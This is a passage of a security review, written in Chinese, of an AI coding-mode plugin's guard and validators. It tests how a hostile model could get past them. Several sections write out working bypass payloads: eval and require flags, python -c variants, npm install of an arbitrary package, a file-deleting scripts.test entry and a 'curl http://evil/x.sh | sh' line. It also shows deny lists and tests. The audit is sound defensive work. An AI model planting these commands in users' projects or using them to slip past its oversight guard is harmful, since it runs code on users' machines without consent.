**最后一条不是 bug 但值得说**：§4-N1 证明守卫本身是可靠的（单调拒绝、state 只影响文案）。也就是说，这个模式的安全边界**完全取决于 `plando_*` 工具的内部实现**——因为它们绕过了守卫。这一轮把 `checks.js` 补成了真正的白名单（几百行，方向对，11 条攻击全挡），但 `scaffold.js` 的 `scripts` 值校验还停在一串正则上——**它挡得住写进报告的 payload，挡不住多一个参数**。**「不代写」的边界不是提示词写的，是这两个文件写的。**

---

## 7. 对当前工作树的复核（最终版）

写报告期间，另一路改动一直在动 `lib/`（`state.js` / `project.js` / `format.js` / `cards.js` / `checks.js` / `scaffold.js` / `git.js` / `tools.js` / `policy.js` 全部有未提交改动，到本文定稿时 `node --test` 已 **341 全绿**）。所以我把每条发现都对着**当前工作树**重跑了一遍——一条命令出版表：

```powershell
node $env:TEMP\plando-review\probe-final5.mjs
```

| 编号 | 复核项 | 问题仍成立？ | 实测（最终工作树） |
|---|---|---|---|
| **G1** | `declare` 命令 = 任意代码执行 | **否（已修）** | 11 条命令**全部在 declare 阶段被拒**：`node -e "…"` / `cmd /c echo` / `node --eval="…"` / `node --require=./r.cjs --test` / `python -c"…"` / `python3 -c"…"` / `node --test --test-reporter=./r.cjs` / `node --run test` / `pip install x` / `cargo run` / `java -jar x.jar` |
| G1b | `declare` 不校验卡 id 存在 | 否（已修） | `plando：卡片 ghost 不存在——下一步：先 action=list 看真实卡 id` |
| **G2** | `scaffold` 的 `scripts` 值校验 | **是（denylist 可绕）** | 白名单 7 项：`package.json` / `tsconfig.json` / `.gitignore` / `.env.example` / `pyproject.toml` / `requirements.txt` / `Cargo.toml`；`vite.config.js` / `README.md` / `index.html` / `scripts.postinstall` **全部拒绝**；`node -e "…"` / `curl … \| sh` 也拒了。<br>**但插一个参数就过**：`python -X utf8 -c "…"` / `python -u -c` / `py -3 -c` / `npm install evil-pkg` → **落盘成功**（§8.5，端到端复现 `PWNED.txt 存在 = true`） |
| G3 | 卡 id 路径穿越 | 否（已修） | `第 1 张卡的 id 只能用字母、数字、- 和 _，长度 1–40` |
| **G4** | `dir` 未校验 | **否（已修）** | `init` 到已有 `IDEA.md` 的目录 → `…里已经有 IDEA.md——立项后会把它们当成模式产物覆盖。换一个空目录…`，`IDEA.md` 首行仍是 `"# 我手写的项目想法"`；`dir=".."` → `dir 必须是绝对路径（收到「..」）`；`activeProjectDir` 保持 `""` |
| M1 | 渲染失败但 state 已推进、日志无记录 | 否（已修） | 顺序已改成 **render → save → log**；TECH.md 换成目录后 `stage = tech`（没推进） |
| M2 | 拒绝不留痕 | **否（已修）** | 8 次不同拒绝 → **8 次全留痕**：`card done 坏证据` ✓、`card start 未知卡` ✓、`scaffold 白名单外` ✓、`scaffold 未知 tech` ✓、`check 未声明` ✓、`idea drop 不存在` ✓、`project open 不存在` ✓、`transition 非法事件` ✓ |
| M3 | 错误文本超 160 字 | **否（已修）** | 长路径 + 坏 state.json 下：`transition=160`、`card=160`、`scaffold=160`、`check=160`、`clarify=160` |
| M4 | 证据/收尾只校验「不是空话」 | **是（部分已修）** | `{kind:'check',summary:'我懂了'}` → **被拒**（`证据太短…`）；但 `{kind:'check',summary:'跑了 vite build，退出码 0'}`（**从没跑过**）→ `卡片 c1 已 done。`；全卡 downgrade → `cards_done` → `ship_pass{explain:'好了'}` → **`stage=done`**，项目文件只有 `["IDEA.md","TECH.md"]`，`checks.json` 不存在 |
| M5 | `paused` 不阻止推进 | 否（契约已消解） | `CONTRACT.md` §2 现在写明「不冻结状态机」。**遗留**：`policy.js` 那句「先 resume 恢复，再按阶段推进」与契约不一致，建议改文案 |
| M6 | ship 阶段说「边做边学」+ 提示不存在的 `action=verify` | 否（已修） | `checks.js` 的 `head` 改成空串；两处都改成 `action=done（evidence.kind=check）`；实测 `含「边做边学」= false`、`含 action=verify = false` |
| L1 / L2 | 重复卡 id / 重复 tech id | 否（已修） | `卡片 id 重复：dup…` / `技术项 id 重复：t1…` |
| L3 | 灵感 id 同毫秒撞号 | 否（已修） | `nextIdeaId` 加后缀去重；2 条 / 2 个唯一 id |
| **L4** | 无输入规模上限 | **是** | `clarify answers` 2MB → `state.json` = **2 098 443 字节** |
| L5 | 白名单含用户内容文件 | 否（已修） | `README.md` / `index.html` 已移除 |
| L6 | `VERIFY.md` 漏提交 | 否（已修） | `ARTIFACT_PATHS` 含 `VERIFY.md`，`test/git.test.js` 断言同步 |
| **L7** | `clarify record` 不重渲染 | **是** | 调用前后目录均只有 `.plando` |
| **L8** | 守卫对未知名工具放行 | **是（大幅收窄）** | 仍放行：`node` / `present`（这两个确实无害）<br>已改为拒绝：`fs_write` / `mcp__filesystem__write_file` / `powershell` / `cmd` / `exec` / `spawn_teammate` / `write` / `edit` / `apply_patch` / `bash` / `pwsh` / `run_code` / `subagent` / `workflow` |
| N1 | 守卫对四个危险能力单调拒绝 | 仍符合预期 | 伪造 `stage=done`：`write/edit/bash/pwsh/run_code/subagent/workflow` **全拒**，`read/grep` 放行 |

**复核结论**：那批并发改动修掉了 **G1 / G1b / G3 / G4 / M1 / M2 / M3 / M6 / L1 / L2 / L3 / L5 / L6**，大幅收窄了 **L8**，部分修了 **M4**，并用改契约的方式消解了 M5。**只剩 G2 一条高危 + M4 一条中危。**

**但仍然不能发，因为：**

- **G2 仍然活着**——`scaffold` 的 `scripts` 值走的是正则 denylist（`SCRIPT_VALUE_DENY`），在 `python` 和 `-c` 之间插一个 `-X utf8` / `-u` / `-I` / `-3` 就穿过去了。§8.5 有完整端到端：一次 `plando_scaffold` 落盘 + 用户敲 `npm test` → `PWNED.txt 存在 = true`。**这条不需要 G1 配合，也不依赖平台**（Windows 上用户走 `cmd /c`，Linux 上 `spawnSync('npm')` 直接通）；
- **M4 的「零产出也能 done」还在**（全卡 downgrade + 自证 `ship_pass` → `stage=done`，项目里一行用户代码都没有）；
- L4 / L7 / L8 是观察项，可以进 KNOWN-ISSUES。

`node --test` 现在是 **341 passed / 0 failed**（定稿时）。**但这套测试守的是「正常流程能跑通」，不是「坏模型跑不通」**——G2 / M4 一条测试都没有（§5）。写报告期间还亲眼看到三次「因为没测试所以没人发现」：`git.js` 加了 `VERIFY.md` 忘了同步断言（红）、`checks.js` 里 `INTERPRETER_DENY_PREFIXES is not defined` 的 `ReferenceError`（改 `validateCommand` 漏改常量名，恰好那条分支没测试走过，绿灯）、以及 §8.5 这个 denylist 洞一路绿灯活到最后。**这块代码的改动速度和测试覆盖差得太远。**

---

## 8. 对 G1 / G2 修复（`checks.js` + `scaffold.js`）的对抗性复核

那批改动给 `checks.js` 加了 `ALLOWED_COMMANDS`（白名单）、`INTERPRETER_DENY_FLAGS` / `INTERPRETER_DENY_PREFIXES` / `DANGEROUS_SUBCOMMANDS` / `DANGEROUS_COMMAND_NAMES`（黑名单）、包管理器子命令白名单，给 `scaffold.js` 加了 `SAFE_SCRIPT_KEYS` 和 `validateContent`。方向都对，我把它们当新代码单独打了一遍——**打出来四个洞，其中三个是「仍然能执行任意代码」**。

> 写这一节的过程中这批代码还在改：`--eval=` / `--require=` / `--import=` 在我最终复核时已经被拦住了（§8.2 / §8.3 保留为「修法长什么样 + 为什么当时会漏」的记录）。**但 §8.7 的四条在最终工作树上全部实测可复现。**

### 8.1 已经挡住的部分（实测有效）

```
放行 → 拒绝   "node -e \"1\""              命令里的「-e」会让检查变成执行任意代码，不允许
放行 → 拒绝   "node --eval=\"…\""          同上（贴值形式，已修）
放行 → 拒绝   "node --require=./x.cjs"     同上（预加载形式，已修）
放行 → 拒绝   "node -r ./x.js --test"      同上
放行 → 拒绝   "node --import=./x.mjs"      同上
放行 → 拒绝   "cmd /c echo"                「cmd」是 shell，检查命令不允许调 shell——写具体那一条检查（如 node --test）
放行 → 拒绝   "powershell -Command x"      「powershell」是 shell，检查命令不允许调 shell
放行 → 拒绝   "python -c print(1)"         命令里的「-c」…（空格形式）
放行 → 拒绝   "python --eval x"            命令里的「--eval」…
放行 → 拒绝   "NODE_OPTIONS=--eval=1 …"    「NODE_OPTIONS=--eval=1」不在允许的检查命令里
放行 → 拒绝   "node /abs/path.js"          「node /abs/path.js」带了路径…
放行 → 拒绝   "npx tsx evil.ts"            「npx tsx」会下载并执行任意包
放行 → 拒绝   "yarn dlx evil"              「yarn dlx」会安装或执行任意包
放行 → 拒绝   scaffold: vite.config.js / README.md / index.html / scripts.postinstall
```

### 8.2 洞一（当时严重，现已修）：`--flag=value` 等号形式绕开参数黑名单

`DANGEROUS_FLAGS` 里的 `'-e'` / `'--eval'` / `'-p'` 是**精确匹配**（`includes(token)`），而 `node --eval=code` 是**一个** token，不等于 `--eval`，于是直接放行——但 Node 会把它当 `-e code` 执行。

**最小复现（两次调用，不用 scaffold）**：

```js
plando_card  { action:'declare', dir, id:'c1',
  command:`node --eval="require('node:fs').writeFileSync('index.html','<h1>AI 代写</h1>')"` }
→ 已为卡片 c1 声明检查命令：node --eval="require('node:fs').writeFileSync…

plando_check { action:'run', dir, name:'c1' }
→ · 检查 c1：通过｜退出码 0
→ index.html = "<h1>AI 代写</h1>"     ← 用户手写的页面被覆盖
```

实测（写这一节时的 probe-final2 / probe46）：

```
node -e "…"（空格形式）: 声明被拒
cmd /c echo（shell）: 声明被拒
node --eval="…"（等号形式）: 声明通过 / · 检查 c1：通过｜退出码 0 / index.html 被改写
python -c"…"（黏连形式）: 声明通过 / · 检查 c1：通过｜退出码 0 / PY.txt 被创建
node --require=./x.cjs --test: 声明通过 / · 检查 c1：通过｜退出码 0 / REQ.txt 被创建
```

**最终复核（probe44 / probe61，对着当前工作树）**：`node --eval=` / `node --print=` / `node -p=` / `node --require=` / `node -r` / `node --import=` / `node --loader=` / `node --experimental-loader=` **全部已拒**（`命令里的「…」会让检查变成执行任意代码，不允许`）。这条洞已经补上了。

**精确一点的实测边界**（当时为了不把话说满记下来的，留着有用）：

- `--eval=` **真的能执行**：`node --eval=require("node:fs").writeFileSync("E.txt","x")` → exit 0，`E.txt` 创建；
- `--print=` 的**等号形式不落副作用**（`--print=foo` 被 Node 当成不认识的模块名，`stdout` 是 `undefined`、文件没创建）；而 `--print <code>` 空格形式能执行，但那条已被黑名单挡住；
- `-p=1` → `node: bad option`，不构成执行；
- `--import=./x.mjs` 实测没能触发副作用（Node 24 对相对路径解析行为不同），但 `--require=` / `-r` **确实执行**（`REQ.txt` / `R.txt` 被创建）。

### 8.3 洞二（当时严重，现已修）：`--require=` / `-r` 预加载任意模块

`-r` / `--require` 会让 Node **在执行任何东西之前先 `require` 指定模块**，等于任意代码执行，而且命令层面看起来完全正常（`node --require=./x.cjs --test`：白名单里的 `node`、正常的 `--test`、项目内相对路径）。

实测（probe42 / probe58，直接 `spawnSync` 验证）：

```
--require=./evil.cjs --test   → exit 0 | 加载代码 = true
-r ./evil.cjs --test          → exit 0 | 加载代码 = true
--import=./evil.cjs --test    → exit 0 | 加载代码 = false   （Node 24 对相对路径 --import 不生效）
--loader=./evil.cjs --test    → exit 0 | 加载代码 = false
```

经 `plando_*` 工具的完整链路（probe-final2）：

```js
// 先准备一个 .cjs（模型可以借「检查脚本」名义让用户写，或直接写进已有文件）
plando_card  { action:'declare', dir, id:'c1', command:'node --require=./pre.cjs --test' }
→ 已为卡片 c1 声明检查命令：node --require=./pre.cjs --test
plando_check { action:'run', dir, name:'c1' }
→ · 检查 c1：通过｜退出码 0
→ REQ.txt 被创建                  ← 任意代码执行
```

**最终复核（probe61）**：`node --require=./pre.cjs --test` 现在**声明阶段就被拒**。已修。

### 8.4 修法（已被采纳的部分）

**不要按 token 精确匹配，要先把「参数名」归一化**：

**不要按 token 精确匹配，要先把「参数名」归一化**：

```js
// `--eval=x` / `-e<code>` / `--require=./a.js` 都取出参数名再查表
function flagName(token) {
  if (typeof token !== 'string' || !token.startsWith('-')) return null;
  const eq = token.indexOf('=');
  return eq > 0 ? token.slice(0, eq) : token;
}
```

然后把这些**一律拒**（它们没有「跑测试」的合法用途）：

```js
const FORBIDDEN_FLAGS = new Set([
  '-e', '--eval', '-p', '--print',           // 内联执行
  '-r', '--require', '--import', '--loader', '--experimental-loader',  // 预加载即执行
  '-i', '--inspect', '--inspect-brk',        // 交互式 REPL / 调试口
  '--env-file',                              // 能读项目外的文件
]);
```

再补一条「解释器 + 任意未知参数」的兜底：`node` / `python` 这类，**只允许已知安全参数**（`--test`、`--test-only`、`--version`、`--help`、`-m <module>` 之类），见 `-` 开头但不在允许集里 → 拒。白名单里其他工具（`npm` / `npx` / `cargo` …）只允许子命令白名单（`npm test` / `npm run build` / `npx vitest run`），不接受 `npm exec` / `npx --yes` / `npm run-script` 之后跟任意参数。

最彻底的做法：**不接受 `command` 字符串，只接受 `{cmd, args[]}`**。这样「等号形式」「黏连形式」「预加载」三类洞一次性消失——因为 `args` 是一个个 token，`--eval=code` 这种 Token 根本不可能被拼出来。

### 8.5 洞三（**仍成立**，但换了形态）：`scaffold` 的 `scripts` 值校验是 denylist，一个参数就绕过去

`SAFE_SCRIPT_KEYS` 挡住了 `postinstall` 这类生命周期钩子（好），`scripts` 的**值**现在也过一遍 `SCRIPT_VALUE_DENY` 正则（见 `scaffold.js:51`）。方向对，但**这条 denylist 只拦「已知形状」**，加一个无害参数就穿过去。

**最终工作树上实测的三种绕过**（`validateContent` 直调 + 端到端）：

```js
// 全部过 validateContent，全部落盘成功
scripts.test = `python -X utf8 -c "open('PWNED.txt','w').write('…')"`   // -X utf8 不在正则里
scripts.test = `python -u -c "…"`                                        // -u 同上
scripts.test = `py -3 -c "…"`                                            // py -3 同上
scripts.test = `python -I -c "…"`                                        // -I 同上
scripts.test = `npm install evil-pkg`                                    // 见下
```

为什么现有的正则拦不住：

```js
const SCRIPT_VALUE_DENY = Object.freeze([
  /\bnode\s+(-e|--eval|-p|--print)\b/i,     // node 后必须紧跟开关
  /\bnode\s+-r\b/i,
  /\b(?:python|python3|py)\s+-c\b/i,        // ← 这里要求「python 空格 -c」，插一个参数就失效
  ...
]);
```

`python -X utf8 -c "…"` 里 `python` 后面跟的是 `-X`，不是 `-c`，正则不匹配 → 放行。

**端到端复现（probe-final11，只需要 1 次 `plando_scaffold`）**：

```
项目在 build 阶段（正常流程 5 步）

① plando_scaffold { dir, path:'package.json', techId:'t1', content: JSON.stringify({
     name:'p', version:'1.0.0',
     scripts: { test: `python -X utf8 -c "open('PWNED.txt','w').write('AI 在你机器上执行了代码')"` },
   }) }
   → 已写 package.json。
   → 落盘 scripts.test = "python -X utf8 -c \"open('PWNED.txt','w').write('AI 在你机器上执行了代码')\""
   （用户从没写过 package.json，这份是 AI 整份写的）

② 用户在自己终端敲 `npm test`（npm install 的 postinstall 同理）
   → status = 0
   → PWNED.txt 存在 = true
   → 内容 = "AI 在你机器上执行了代码"
```

**注意这一步完全不需要**：G1 的 `plando_check`、用户已有任何文件、或者 AI 再调第二个工具。**一次 `plando_scaffold` 就把一条命令埋进用户的构建流程里，等用户自己触发。**

**同一段校验的另外两个缺口**：

| 缺口 | 实测 |
|---|---|
| `dependencies` 的版本白名单只认「普通版本号」开头，`latest` / `*` / `workspace:` 都放行（`SAFE_VERSION_RE`）。URL / `git+` / `file:` 已被拒——**这条修得比 `scripts` 好**，但 `latest` 意味着「装什么都行」，仍可指向一个含 `postinstall` 的包 | `{"dependencies":{"evil":"latest"}}` → 放行 |
| `npm install <任意包名>` 作为 scripts 值放行（只拦了 `node -e` / `curl` / `\| sh` 这类**直接**执行形态，没拦「装一个会自己跑代码的包」） | `scripts.test = 'npm install evil-pkg'` → 放行、`npm test` status=0 |

**修法（和 §8.4 同一条原则）**：`scripts` 的值不能走 denylist，直接**复用 `checks.js` 的 `validateCommand`**——我实测过，同一批 payload 在 `validateCommand` 那边**全被拒**：

| payload | `scaffold.validateContent`（现状） | `checks.validateCommand` |
|---|---|---|
| `python -X utf8 -c "…"` | **放行** | 拒绝（它扫**全部** token，不要求 `-c` 紧跟在 `python` 后） |
| `python -u -c "…"` / `-I` / `-W ignore` / `py -3 -c` | **放行** | 拒绝 |
| `python3.12 -c "…"` | **放行** | 拒绝（不在白名单） |
| `npm install evil-pkg` | **放行** | 拒绝 |
| `npx evil-pkg` | **放行** | 拒绝 |
| `tar czf - src.js` | **放行** | 拒绝（`tar` 不在 `ALLOWED_COMMANDS`） |
| `curl … \| sh` / `node -e …` / `bash -c` | 拒绝 | 拒绝 |

差距的来源很具体：`SCRIPT_VALUE_DENY` 用的是「命令名**紧邻**开关」的正则，`validateCommand` 用「遍历 argv 每个 token」。**后者才是对的结构**。

但复用之后仍有两个残余，需要额外一条规则：

- `node evil.js`、`node --experimental-strip-types evil.ts` → `validateCommand` 放行（它只挡「内联执行」，不挡「跑一个文件」）；这类要求磁盘上已有那个文件，而 `scaffold` 白名单写不出 `.js`，所以危害等级低于上面那批——**但仍建议加一条「scripts 值只允许两个字以内的白名单命令」**；
- `dependencies` 的 `latest` / `*` / `workspace:` 仍放行。

**这一条是当前唯一还活着的高危**，也是判决 fix-first 的首要原因。

### 8.5b 当时的原始形态（记录用）：`scaffold` 只校验 `scripts` 的**键**

`SAFE_SCRIPT_KEYS` 挡住了 `postinstall`（好），但最初 scripts 的**值**是任意字符串：

```js
plando_scaffold { dir, path:'package.json', techId:'t1', content: JSON.stringify({
  name:'p', version:'1.0.0',
  scripts: {
    test:  `node -e "require('node:fs').rmSync('src',{recursive:true})"`,
    build: `curl http://evil/x.sh | sh`,
  },
})}
→ 已写 package.json。
→ 落盘内容：{"scripts":{"test":"node -e \"…rmSync('src'…)\"","build":"curl http://evi…
```

当时的合体链路（`node --run test`，那条**现已封**）：

```
（当时）① scaffold 写 {"scripts":{"test":"node -e \"require('node:fs').rmSync('src.js')\""}} → 已写 package.json。
（当时）② plando_card declare  command:'node --run test' → 已为卡片 c1 声明检查命令：node --run test
（当时）③ plando_check run     → · 检查 c1：通过｜退出码 0
        用户文件 src.js 还在 = false          ← 被 scripts.test 删掉了
（现在）② plando_card declare  command:'node --run test' → 命令里的「--run」会让检查变成执行任意代码，不允许
```

`node --run <script>` 是 Node 22+ 的原生「跑 package.json 脚本」，现已进 `INTERPRETER_DENY_FLAGS`，所以**「`plando_check` 自己跑」这条最坏的链路断了**——但危险内容还留在 `package.json` 里，退化成了「用户自己跑」（§8.5 主条）。**洞在 `scaffold` 的内容校验，不在 `check` 的参数校验**：后者再怎么收紧，只要前者能往 `scripts` 里写任意字符串，这条链就还在。

顺带一个精度修正：`npm test` / `npm start` 这类走 `spawnSync('npm', …, {shell:false})` 的调用，在 **Windows 上会 ENOENT**（`spawnSync` 不查 PATHEXT，`npm` 实际是 `npm.cmd`/`npm.ps1`）。这曾经让我以为 npm 链路是死条目——**但用户自己敲 `npm test` 走的是 `cmd /c`，照样执行**（probe-final9 实测：`cmd /c npm test` 跑 `node -e "rmSync('src.js')"` → `src.js 还在 = false`）。所以「Windows 上 npm 链路不通」只对 `plando_check` 成立，**对真实用户不成立**。

### 8.6 建议补的测试

```js
// G1：现在全被拦住了，但一条测试都没有 → 必须补，否则下次改 checks.js 会静默破防
for (const command of [
  'node -e "1"', 'node --eval="1"', 'node --eval=1', 'node --print=1', 'node -p=1',
  'python -c"1"', 'python -c1', 'python3 -c"1"', 'py -c"1"',
  'node -r ./x.cjs --test', 'node --require=./x.cjs --test',
  'node --import=./x.mjs --test', 'node --loader=./x.mjs --test',
  'node --test --test-reporter=./x.cjs', 'node --test --test-reporter-destination=./o.txt',
  'node --run test',
  'pip install x', 'python -m pip install .', 'uv pip install x',
  'cargo run', 'go run ./x.go', 'dotnet run', 'java -jar x.jar',
  'cmd /c "echo x"', 'powershell -Command x', 'sh -c "x"',
  'node /abs/path.js', 'npx tsx evil.ts',
]) {
  assert.match(await card({ action:'declare', id:'c1', command, dir }), /不允许|白名单/, command);
}
// 同时要保住「合法检查不能被误杀」——过度拦截同样是 bug
for (const command of ['node --test', 'npm test', 'python -m pytest', 'cargo test', 'go test ./...', 'npx vitest run']) {
  assert.equal(validateCommand(command), null, command);
}
// G2 的 scripts 值（最关键的一条，目前完全没测）
const hostile = JSON.stringify({ name:'p', scripts:{ test:`node -e "require('node:fs').rmSync('src')"` } });
assert.match(await scaffold({ path:'package.json', content: hostile, dir, techId:'t1' }), /不允许|脚本/);
```

### 8.7 洞四（写这一节时可复现，现已被修）：`python -c` 黏连、`--test-reporter`、`--run`、包管理器安装

前面 8.2–8.4 修的是「参数名精确匹配」的问题，但修法治的是**已知形状**，下面四条都是**白名单内的正常命令 + 一个没被列入黑名单的开关**。写这一节时四条全部可复现：

| # | 命令 | 当时 | 实测后果 | 根因 |
|---|---|---|---|---|
| **①** | `python -c"代码"`、`python3 -c"…"`、`py -c"…"` | 放行 | `· 检查 c1：通过｜退出码 0`，`PY3.txt` / `PY5.txt` / `PY6.txt` 被创建 | `-c` 空格形式已拦，但**贴值形式**没按解释器区分（`node -c` 只是语法检查，`python -c` 是内联执行） |
| **②** | `node --test --test-reporter=./evil.cjs` | 放行 | exit 0，`RPT.txt` 被创建 | `--test-reporter` 会 **`require` 指定模块**，等价于 `--require` |
| **③** | `node --run <script>` | 放行 | exit 0 且删掉了用户文件 | 原生跑 `package.json` 脚本，直接串上 §8.5 的 `scripts` 值洞 |
| **④** | `pip install x` / `python -m pip install .` / `uv pip install x` / `cargo run` / `go run ./x.go` / `dotnet run` / `java -jar x.jar` | 放行 | `pip install ./pkg` 跑 `setup.py` 里的任意代码，status 0，命中文件被创建（probe63） | 这些命令的**本质就是「执行代码」**，放进「检查命令」白名单等于没有白名单 |

**最终复核（probe66 / probe72 / probe-final5）：①–④ 现在全部被拒**——`GLUED_FLAGS_BY_BASE` 按解释器区分了贴值前缀、`INTERPRETER_DENY_FLAGS` 加了 `--test-reporter` / `--test-reporter-destination` / `--run`、`RUN_SUBCOMMANDS` 挡了 `pip install` / `cargo run` / `go run` / `dotnet run`、`RUN_FLAGS` 挡了 `java -jar`、`SAFE_PY_MODULES` 挡了 `python -m <任意模块>`。这块修得比 §8.2–8.4 那次彻底。

**仍残留的三个「放行了但目前打不通副作用」的隐患**（不进判决，但建议进 KNOWN-ISSUES）：

| 命令 | 放行后果 |
|---|---|
| `node -i` | REPL；`spawnSync` 无 stdin 会立刻 EOF 退出，无副作用 |
| `node --inspect` / `--inspect-brk` | 起调试端口；`--inspect-brk` 会**挂住直到 60s 超时**（实测 4012ms 被我的 4s 超时打断，插件的 `CHECK_TIMEOUT_MS` 是 60s → 每次挂满一分钟） |
| `node --test --watch` / `node --watch x.js` | 同上，`--watch` 永不退出，会**挂满 60s 超时**。正常用户也可能写出来，属体验问题 |
| `node --env-file=.env x.js` | 能读项目外配置；需要 `x.js` 存在才会跑，单独不构成执行 |
| `deno run x.ts` / `bun run x.ts` | 这两个解释器的**核心用法就是执行文件**，但本机没装 deno/bun，实测不了（`validateCommand('deno run x.ts')` 判**放行**） |
| `pip run evil` | `pip` 没有 `run` 子命令，属误放行（无害） |
| `pytest --version` | 正常用法，放行是对的 |

**根因还是同一条**：这套校验的主体是「黑名单列举危险形状」，而危险形状是无穷的（每加一个工具就多一批「会加载代码」的开关，每加一个参数又可能漏一个）。这一轮修补得很扎实（§8.7 的四条都关上了），但**只有改成白名单——`{cmd, args[]}` 结构 + 每个解释器各自允许的 argv 模板——才能真正收敛**。`deno run` / `bun run` 现在就是这条规则的活证据：它们「跑一个文件」和「跑一个检查」在 argv 上无法区分。

---

顺带记两个新入口（都由那批改动引入，属 M3 的同类；**修 `errText` 时一并包上**）：

- `tools.js` 的 containment 抛错直接拼字符串，没过 `errText` 截断（路径长时超 160）；
- `project.js` 新加的 `inspectShape` 报错同样把绝对路径 + 问题列表拼进 reason。

**测试状态**：当前工作树 `node --test` 是 **341 passed / 0 failed**（定稿时）。写报告期间出现过两次红灯（`git.js` 加了 `VERIFY.md` 但 `test/git.test.js` 没同步；`checks.js` 里 `INTERPRETER_DENY_PREFIXES is not defined` 的 `ReferenceError`），都已被并发改动补齐。

但 §5 说的「这些 bug 之所以全绿」依然成立——测试集没覆盖 **G2 / M4**（G1 / G3 / G4 / M1 / M2 / M3 / M6 / L1 / L2 / L3 / L5 / L6 已被新测试或新代码守住）。

---

*本报告只写结论，未修改 `lib/` 下任何源文件、未修改任何测试；未创建/完成任何团队任务；未提交 git。唯一新增文件是本报告。复现脚本在 `%TEMP%\plando-review\`（`probe.mjs`、`probe2–75.mjs`、`probe-verify.mjs`、`probe-final3/4/5/6/7/8/9/10/11.mjs`），仓库不留文件。*

重跑全部复核：

```powershell
node $env:TEMP\plando-review\probe-final5.mjs    # 一条命令出「还成不成立」的完整表（§7 即来自它）
node $env:TEMP\plando-review\probe-final11.mjs   # G2 端到端：scaffold 埋值 → 用户 npm test → 文件被创建
node $env:TEMP\plando-review\probe-final6.mjs    # G2 逐条 payload / dependencies / M4 / M2 / L8 一页看完
node $env:TEMP\plando-review\probe72.mjs         # 只看 checks.validateCommand 现在放行/拒绝了什么
node $env:TEMP\plando-review\probe71.mjs         # 实测 npm 链路在 Windows 上 ENOENT（平台差异）
```

---

## 9. 修复后复核（Lead 处置记录）

> **这一节是复核证据，不是新的判决。判决仍在 §6，仍是 fix-first。**
>
> Lead 在 `7faeddb`（`fix(review): 闭合 REVIEW-state R1-R9 与 REVIEW-tools G1/G2/M1/M2/M4/L4/L7/L8`）、`ac84349`、`2c3c677`、`ab5f108` 里提交了针对本报告的一批修复。我用 §7 那套脚本**逐条对着 HEAD `ab5f108` 重跑**，结果分三部分：哪条真关上了（§9.2）、哪条还开着（§9.3）、这批修复自己引入了什么（§9.4）。
>
> 一句话结论：**14 条真正闭合，3 条部分闭合（G2 / M4 / L4），1 条收窄但没收死（L8）；L4 的修法还换来一个新高危 N14。G2 因为 `npm` 链路被同时修好，端到端攻击路径比修复前更短了。**
>
> **后续更新（三层）**：
>
> - **§9.6.1–§9.6.6**：Lead 提交 `76e37b8` 后重跑。G2 攻击面 14/15 闭合、N14 真修好；但 N15 的修法**新引入 N19（任意路径写入，高）**，且 G2 的修法**误杀 9/22 常见 build 写法**。
> - **§9.6.7**：M4 的在途修复（`kind:'check'` 与真实执行记录对账）。
> - **§9.6.8（最新）**：N19 与误杀**都已闭合**，`&&` 改成按段校验，「友好壳」有独立校验；误杀从 9/22 降到 0/10。**仍开的是 `npx` 第二份名单漂移、`--env-file` 读外部文件、`node evil.js`、以及 M4 的三个残余（`kind:'files'` / 全卡 downgrade / downgrade.reason）。**
>
> **当前有效的状态与优先级只看 §9.6.8。**

### 9.1 处置表

| 编号 | 严重度 | Lead 的修法（一句话） | 现状 |
|---|---|---|---|
| **G1** | 高 | `checks.js` 从「信任字符串」改成白名单：`ALLOWED_COMMANDS` + `INTERPRETER_DENY_FLAGS` + `GLUED_FLAGS_BY_BASE` + `RUN_SUBCOMMANDS` / `RUN_FLAGS` / `SAFE_PY_MODULES`，并且**遍历 argv 每一个 token**（等号式 `--eval=x`、黏连式 `-e…`、`python -c"…"` 一起挡） | **已闭合**：14/14 攻击命令在 `declare` 阶段被拒 —— `node -e "…"` / `cmd /c echo` / `node --eval="…"` / `node --require=./r.cjs --test` / `python -c"…"` / `python3 -c"…"` / `node --test --test-reporter=./r.cjs` / `node --run test` / `pip install x` / `cargo run` / `java -jar x.jar` / `npx evil-pkg` / `npm install evil-pkg` / `npm ci` |
| **G2** | 高 | `scaffold.validateContent` 里对 `scripts` 的**值**加 `SCRIPT_VALUE_DENY` 正则、对四个 `*ependencies` 加 `SAFE_VERSION_RE`、加 `MAX_CONTENT_CHARS = 1 MB` | **部分闭合，高危仍成立**：`postinstall` / `node -e` / `curl \| sh` / `eval` / `rm -rf` / `powershell` 已拒；**但 `scripts` 的值仍然是 denylist**，`python -X utf8 -c "…"` / `python -u -c` / `python -I -c` / `py -3 -c` / `python3.12 -c` / `npm install <包>` / `npm ci` / `npx <包>` / `node evil.js` / `bash -c "…"` / `NODE_OPTIONS=--require=./evil.cjs node --test` **全部放行** → 见 §9.3 |
| **G3** | 高 | `state.js` 加 `CARD_ID_RE`（`^[A-Za-z0-9_-]{1,40}$`）、`tools.writeText` 做路径 containment | **已闭合**：`../x` / `..\x` / `a/b` / `%2e%2e` / `CON` / 41 字全拒，`ESCAPED.md` 未越界落盘 |
| **G4** | 高 | `dir` 必须绝对路径；`init` 遇到目录里已有模式产物就拒；`noteActiveDir` 移出 `resolveDir` | **已闭合**：指向已有手写 `IDEA.md` 的目录被拒且**用户文件首行未变**；`dir=".."` → `dir 必须是绝对路径`；`activeProjectDir` 保持 `""` |
| **M1** | 中 | `afterTransition` 改成「先渲染（内存）→ 再 `saveState` → 再写日志 → 再 commit」 | **已闭合**：把 `TECH.md` 换成同名目录后 `stage` 停在 `build`（原 `build`），没有「状态已推进、产物没更新」 |
| **M2** | 中 | `tools.run()` 统一在 catch 里写 `{kind:'reject', source:'tool', reason}` | **已闭合**：8 种不同拒绝 → 8 条留痕（另有字段缺失，见 §9.4-N16） |
| **M3** | 中 | 错误文本统一过 `truncate` | **已闭合**：5 个工具在超长路径 + 坏 `state.json` 下 max 都是 160 |
| **M4** | 中 | `cards.checkEvidenceObservable` 挡空话（太短 / 只有填充词 / 只有「完成」类词） | **部分闭合**：「我懂了」「没问题」「可以了」「完成了」「好」已拒；**但「跑了一下」「everything works」「跑了 vite build，退出码 0」仍直接过**；零产出 `全卡 downgrade → cards_done → ship_pass{explain:'好了'}` 仍能到 `stage=done`（项目里只有 `IDEA.md` + `TECH.md`，`checks.json` 不存在） |
| **M5** | 中 | 改契约（`CONTRACT.md` §2「暂停不冻结状态机」）+ `ac84349` 让 `policy.js` 的暂停文案与契约一致 | **已闭合（以改契约消解，不是加校验）**：守卫文案现在是「…（暂停不冻结状态机；想清掉提醒就传 …resume）」 |
